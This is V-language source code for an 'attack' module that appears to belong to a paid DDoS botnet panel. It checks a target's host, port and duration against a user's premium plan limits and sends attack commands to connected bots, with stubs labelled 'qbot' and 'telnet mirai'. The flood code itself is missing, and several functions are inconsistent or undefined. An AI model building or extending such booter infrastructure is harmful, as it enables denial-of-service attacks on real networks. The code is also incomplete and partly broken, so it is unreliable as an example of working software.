/*
	import core.attack

	args := os.args.clone()

	mut a := attack.prepare(args, attack.AttackType.all)
	if typeof(a).name != typeof(AttackInfo{}).name || a != Responses.success {
		println(attack.response_err(a))
	}

	a.send_attack()

*/
module attack

import net
import core.crud

pub type Attack = Responses | AttackInfo | AttackType

// Attack.FIELD
pub struct AttackInfo {
	pub mut:
		host		string
		port 		string
		time		string
		method		string

		user    	crud.User
		bots		[]net.TcpConn
		attk_t  	AttackType
}

pub enum AttackType {
	_none
	bots
	api
	raw
	telnet
	all
}

// Respones.EnumElement
pub enum Responses {
	error

	// Attack Type Response
	invalid_attack_type

	// Input Responses
	invalid_arg
	invalid_host
	invliad_url
	invalid_ip
	invalid_port
	invalid_time
	invalid_method

	// Plan Responses
	no_plan
	max_conn_used
	over_user_maxtime

	// Valid Response
	success
}

// crud.VARI
pub const invalid_attack_type = "[ x ] Error, Invalid Attack Protocol Type!"
pub const invalid_arg = "[ x ] Error, Invalid argument!"
pub const invalid_host = "[ x ] Error, Invalid host provided!"
pub const invalid_port = "[ x ] Error, Inalid port provided!"
pub const invalid_time = "[ x ] Error, Invalid time provided!"
pub const invalid_method = "[ x ] Error, Invalid method provided!"
pub const internal_err = "[ x ] Error, Internal code error!"

pub const no_plan = "[ x ] Error, User not premium!"
pub const max_conn_used = "[ x ] Error, User has the max concurrent attacks running!"
pub const over_user_maxtime = "[ x ] Error, Time used is over the user's maxtime!"

pub fn response_err(r Responses) string {
	match r {
		.invalid_arg {
			return invalid_arg
		}
		.invalid_host {
			return invalid_host
		}
		.invalid_port {
			return invalid_port
		}
		.invalid_time {
			return invalid_time
		}
		.invalid_method {
			return invalid_method
		} else { return internal_err }
	}
}

pub fn (mut a AttackInfo) validate_info() bool {
	if a.host == "" || a.port == "" || a.time == "" || a.method == "" {
		return false
	}

	if a.user.username == "" {
		return false
	}
	return true
}

// use this function then a.send_attack
pub fn prepare(args []string, user_info crud.User, mut bots []net.TcpConn, attack_type AttackType) AttackInfo {
	mut a := AttackInfo{}

	if args.len < 4 {
		return a
	}

	a.host = args[1]
	a.port = args[2]
	a.time = args[3]
	a.method = args[0]
	a.user = user_info
	a.attk_t = attack_type

	if a.filter_inputs() != Responses.success { 
		return a
	}

	if a.user.username == "" { 
		return a
	}

	a.validate_plan()
	return a
}

pub fn (mut a AttackInfo) filter_inputs() Responses {
	ip := a.host

	
	if (ip.starts_with("https://") == false && ip.starts_with("http://") == false) || char_count(ip, ".") != 3 {
		return Responses.invalid_host
	}

	first_digit := ip.split(".")[0]
	second_digit := ip.split(".")[1]
	third_digit := ip.split(".")[2]
	last_digit := ip.split(".")[3]

	if (first_digit.int() == 0 || first_digit.int() > 255) || (second_digit.int() == 0 || second_digit.int() > 255) || (third_digit.int() == 0 || third_digit.int() > 255) || (last_digit.int() == 0 || last_digit.int() > 255) {
		return Responses.invalid_ip
	}

	// Port Validation
	if a.port.int() == 0 || a.port.int() > 65500 {
		return Responses.invalid_port
	}

	// Time Validation
	if a.time.int() == 0 || a.time.int() < 20000 {
		return Responses.invalid_time
	}

	return Responses.success
}

pub fn (mut a AttackInfo) validate_plan() Responses {
	if a.user.plan == 0 { return Responses.no_plan }
	if a.time.int() > a.user.maxtime { return Responses.over_user_maxtime }
	if a.user.ongoing == a.user.conn { return Responses.max_conn_used }
	return Responses.success
}

pub fn (mut a AttackInfo) send() Attack {
	// Check if any API, Bots, Telnet or Raw protocols avaliable with the method used
	// use crud functions to get info for attack protocol to match the method being used
	if a.validate_info() == false { return Responses.error }
	match a.attk_t {
		.bots {
			a.send_bots()
			return Responses.success
		}
		.api {
			// sendd to api
			return Responses.success
		}
		.raw {
			// send to raw connection qbot
			return Responses.success
			
		}
		.telnet {
			// send to telnet mirai
			return Responses.success
		}
		.all {
			// send to all protocols
			return Responses.success
		} else {
			return Responses.error
		}
	}
	return Responses.error
}

pub fn char_count(str string, ch string) int {
	mut c := 0
	for i in 0..str.len {
		mut cch := str[i].ascii_str()

		if cch == ch {
			c++
		}
	}
	return c
}